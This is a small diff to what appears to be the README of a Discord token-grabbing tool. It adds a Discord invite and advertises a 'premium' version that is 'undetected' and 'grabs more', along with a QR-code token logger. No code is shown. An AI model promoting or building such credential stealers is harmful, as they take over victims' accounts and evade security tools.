@@ -9,7 +9,10 @@ __      ___    _ _      _____          _   _
     \/    \____/|______\_____/_/    \_\_| \_|
 ```
 
+https://discord.gg/qxt6aC8U2F
+
 ```
+Join my discord server above for support and new projects!
 Join the discord server for premium version(undetected, grabs more)
 AND a qr-code token logger
 
